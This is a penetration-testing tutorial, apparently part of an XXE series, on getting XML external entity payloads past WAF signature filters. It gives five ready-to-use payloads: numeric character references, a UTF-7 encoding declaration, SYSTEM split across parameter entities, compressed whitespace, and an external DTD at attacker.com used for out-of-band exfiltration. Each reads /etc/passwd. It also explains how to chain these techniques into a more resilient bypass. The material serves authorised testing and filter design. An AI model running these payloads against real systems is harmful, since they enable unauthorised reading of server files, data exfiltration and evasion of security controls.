# 05 — XXE WAF / Filter Bypass Techniques

## Real-World Framing

By the time you're testing a target with a WAF (ModSecurity with the OWASP Core Rule
Set, AWS WAF, Cloudflare, Akamai, F5, or an in-house signature filter) or an
application-layer XML schema validator in front of it, your plain payloads from files
2–4 frequently get blocked outright — not because the underlying parser was patched,
but because a request containing the literal strings `<!DOCTYPE`, `SYSTEM`, or `ENTITY`
trips a signature rule before the request ever reaches the vulnerable parser. This is
an extremely common situation in real engagements: the back-end framework's default
parser is still exploitable, but a perimeter control is filtering the *obvious* version
of the attack. Every technique below works by changing the payload's surface
appearance while leaving its actual entity/DTD mechanics — and therefore its effect on
the parser — unchanged. None of this is theoretical; signature-based XML filtering
rules in commercial WAF rulesets are public, and bypassing them by encoding variation is
one of the most consistently reported techniques in WAF-evasion bug bounty writeups.

## Why Signature-Based XML Filtering Is Structurally Weak Against XXE

Most WAF rules for XXE look for some combination of the literal substrings `<!DOCTYPE`,
`<!ENTITY`, `SYSTEM`, `PUBLIC`, and sometimes `file://`. This is a blocklist approach
applied to a grammar (XML) that has multiple legal ways to express the same
construct — character encoding, whitespace flexibility, and entity-based
self-reference are all valid XML, not "tricks" outside the spec. A WAF that only
pattern-matches literal keywords is checking for one specific spelling of an attack
that has many equally valid spellings. This is the same structural weakness that makes
blocklist-based SQLi/XSS filters brittle (covered in the SQLi/XSS series) — XXE is just
a different grammar with its own equivalent escape hatches.

## Technique 1: Character Reference Encoding of Keywords

### The Payload

```xml
<?xml version="1.0"?>
<!D&#x4F;CTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### Piece-by-Piece Breakdown

- `&#x4F;` is a numeric character reference for the letter `O` (hex `4F` = decimal 79 =
  ASCII `O`). Placed inside `<!D&#x4F;CTYPE`, the parser decodes it to the literal
  character `O` *during parsing*, reconstructing `<!DOCTYPE` exactly as the parser sees
  it — but the raw bytes sent over the wire never contain the contiguous substring
  `DOCTYPE`.
- A signature filter doing a literal string match against the raw request body sees
  `<!D&#x4F;CTYPE`, which does not match its `DOCTYPE` signature, and lets the request
  through. The XML parser downstream, however, performs character reference resolution
  as a normal, mandatory part of XML parsing — long before it even gets to interpreting
  what `DOCTYPE` means — so by the time the parser is deciding "is this a DOCTYPE
  declaration," the string has already been reassembled into the exact keyword it
  expects.
- This same technique applies to any keyword the filter is matching on: `SYSTEM`,
  `ENTITY`, `PUBLIC` can each have one or more of their characters swapped for a
  `&#xNN;` numeric reference, or the equivalent decimal form `&#79;` (no `x` prefix,
  decimal instead of hex — both are valid XML and a filter tuned for one encoding style
  may miss the other).

### Why It Evades Detection

The filter is matching against the *serialized byte stream*; the parser is matching
against the *post-decode token stream*. Numeric character references are a
parse-time substitution defined by the XML specification itself, not an
application-level escape sequence — so this gap is unavoidable for any filter that
inspects raw bytes without itself performing a full XML parse before pattern-matching,
which most lightweight WAF signature engines don't do for performance reasons.

## Technique 2: UTF-7 / Alternate Encoding Declaration

### The Payload

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo +AFs- +ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI- +AF0-+AD4-
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### Piece-by-Piece Breakdown

- `encoding="UTF-7"?` in the XML prolog tells the parser to decode the document body
  using the UTF-7 text encoding instead of the default UTF-8, *if the parser supports
  UTF-7 at all* (this technique is narrower than Technique 1 — it only works against
  parsers/libraries that still honor a UTF-7 encoding declaration; many modern parsers
  have dropped or restricted this).
- The string `+ADw-+ACE-DOCTYPE...` is the UTF-7 encoded representation of
  `<!DOCTYPE...` — UTF-7 represents many ASCII punctuation characters (`<`, `!`, `[`,
  `]`, `>`, `"`) using a `+`-prefixed Base64-like shifted sequence rather than the raw
  byte. A filter looking for the literal bytes of `<!DOCTYPE` in the request will not
  find them anywhere in this body, because none of those characters appear in their
  normal single-byte ASCII form.
- The parser, having been told via the `encoding="UTF-7"` declaration to interpret the
  body as UTF-7, decodes the whole thing back into standard XML syntax before
  proceeding — so functionally this is identical to a plain-text `DOCTYPE` declaration
  by the time the parser acts on it.

### Why It Evades Detection

This is a stronger evasion than Technique 1 because it transforms the *entire*
suspicious region, not just specific keywords — a filter would need to fully decode
UTF-7 itself before pattern-matching, which most signature engines do not do by
default since UTF-7 is rare in legitimate traffic. The trade-off is reliability: this
only works where the target parser/library still actually honors UTF-7 declarations,
which has become less common over time, so always verify with a baseline UTF-7 test
payload before assuming this path is open on a given target.

## Technique 3: Parameter Entity Obfuscation (Splitting Keywords Across Entities)

### The Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % p1 "SY">
  <!ENTITY % p2 "STEM">
  <!ENTITY % build "<!ENTITY xxe %p1;%p2; 'file:///etc/passwd'>">
  %build;
]>
<foo>&xxe;</foo>
```

### Piece-by-Piece Breakdown

- `<!ENTITY % p1 "SY">` and `<!ENTITY % p2 "STEM">` — split the literal keyword
  `SYSTEM` across two separate parameter entity values, neither of which contains the
  full word on its own.
- `<!ENTITY % build "<!ENTITY xxe %p1;%p2; 'file:///etc/passwd'>">` — this builds a
  *new* general entity declaration as a string, referencing `%p1;` and `%p2;` inside
  that string. Critically, this concatenation happens during DTD parsing, at the point
  where `%build;` is expanded — the literal request body sent over the wire never
  contains the contiguous substring `SYSTEM` anywhere.
- `%build;` — expanding this parameter entity causes the parser to assemble
  `p1`+`p2` into the full word `SYSTEM` as part of constructing the new `xxe` entity
  declaration, which is then live for the rest of the document exactly as if you'd
  written `SYSTEM` directly.
- `&xxe;` resolves normally afterward.

This same splitting technique works for any other filtered keyword (`ENTITY`,
`DOCTYPE` itself, `PUBLIC`, even `file`) by defining more `%pN;` fragments and
concatenating them inside a `%build;`-style wrapper entity.

### Why It Evades Detection

A signature filter scanning the raw request for the contiguous string `SYSTEM` will
never find it — the six characters `S`, `Y`, `S`, `T`, `E`, `M` are not adjacent
anywhere in the actual bytes sent. Only after the parser performs DTD-level parameter
entity substitution (a step that happens entirely inside the XML engine, invisible to
a filter inspecting the raw request) does the word reassemble. This is conceptually
the XML-DTD equivalent of SQLi comment-splitting or case-variation tricks used against
naive SQL injection filters — break up the signature the filter is looking for using
mechanics the underlying engine will reassemble anyway.

## Technique 4: Whitespace and Structural Variation

### The Payload

```xml
<?xml version="1.0"?><!DOCTYPE foo[<!ENTITY% xxe SYSTEM"file:///etc/passwd">]><foo>&xxe;</foo>
```

### Piece-by-Piece Breakdown

- Note the missing space between `ENTITY` and `%xxe` (`ENTITY%`), and between `SYSTEM`
  and the quoted URI (`SYSTEM"file`). The XML/DTD grammar permits this — whitespace is
  only required between tokens where omitting it would otherwise merge two
  alphanumeric tokens into one ambiguous token; a `%` or `"` is itself a clear token
  boundary, so no separating space is grammatically required there.
- Some lightweight signature filters are written expecting a specific, "normal-looking"
  spacing pattern (`<!ENTITY % xxe SYSTEM "...">` with single spaces, matching how every
  tutorial and tool writes it) and may use a regex anchored to that exact spacing,
  missing the visually denser but equally valid compressed form.
- Conversely, some filters expect *no* extra whitespace and can be evaded by *adding*
  unusual-but-legal whitespace/newlines in the middle of a declaration — both directions
  are worth testing, since you don't know which assumption a given filter's regex made
  without probing it.

### Why It Evades Detection

This relies on the gap between "what a human pattern-writer assumed valid XML always
looks like" and "what the XML grammar actually permits." It is the weakest and most
target-specific of the techniques here — treat it as a cheap, low-effort variation to
try alongside the stronger encoding-based techniques above, not a primary strategy on
its own.

## Technique 5: External DTD Hosted Out-of-Band to Hide the Malicious Keywords from the Request Entirely

### The Payload (sent to the target)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/p.dtd"> %xxe; ]>
<foo>&exfil;</foo>
```

### Piece-by-Piece Breakdown

- The request sent to the WAF-protected target contains only a reference to an
  *external* DTD URL — the words `ENTITY`, `SYSTEM`, and `DOCTYPE` are still technically
  present here, but none of the genuinely sensitive payload content (the file path being
  targeted, the exfiltration endpoint) is in this request at all; that all lives in
  `p.dtd` on attacker-controlled infrastructure, which the WAF in front of the *target*
  never inspects, because it's a separate outbound request the parser makes, not
  something passing through the inbound WAF.
- This is the file 3 OOB exfiltration pattern, but reframed here specifically as a
  bypass: even a WAF that fully understands XML DTD syntax and blocks based on intent
  (e.g. "this defines a SYSTEM entity pointing at a sensitive local path") cannot
  evaluate intent it never sees, because the dangerous specifics are off-loaded to a
  remote file fetched after the request already passed inspection.
- You can additionally apply Techniques 1–3 to *this* minimal request to also hide the
  `DOCTYPE`/`ENTITY`/`SYSTEM` keywords that remain, for defense-in-depth against a
  smarter filter — they compose with each other rather than being mutually exclusive.

### Why It Evades Detection

This shifts the entire problem from "evade keyword detection" to "evade detection of
intent," which is structurally a much harder problem for any perimeter control to solve,
because the WAF would need to fetch and recursively parse the external DTD itself to
understand what it does — something virtually no production WAF does by default.

## Combining Techniques

In practice, the most resilient real-world bypass against a competent WAF stacks
several of these: a minimal external-DTD reference (Technique 5) to keep the inbound
request itself nearly inert-looking, with character-reference encoding (Technique 1)
applied to whatever keywords remain in that minimal request, and the full
keyword-splitting parameter-entity trick (Technique 3) used *inside* the externally
hosted DTD as well, in case the target environment has any internal egress-side
inspection that might also pattern-match outbound DTD fetches.

## Real-World Note

Always test WAF bypass attempts incrementally and confirm each layer independently —
first confirm the *parser* accepts a given obfuscated construct at all (e.g. via a
direct request that bypasses the WAF, if you have one, or via a local test parser
matching the target's known stack) before assuming a blocked production request means
the underlying application is safe. A request being blocked tells you about the WAF's
rule, not about the application's actual vulnerability status — conflating the two is
a common reporting mistake. If every variation above is also blocked, that's meaningful
signal the WAF is doing real XML-aware parsing rather than naive string matching, which
is itself useful information to record in an engagement report.

## What's Next

File 6 covers XXEinjector, which can be combined with several of these bypass ideas
manually (for example, pre-processing a captured request file with character-reference
encoding before handing it to the tool) even though the tool itself does not generate
WAF-evasion variants automatically.
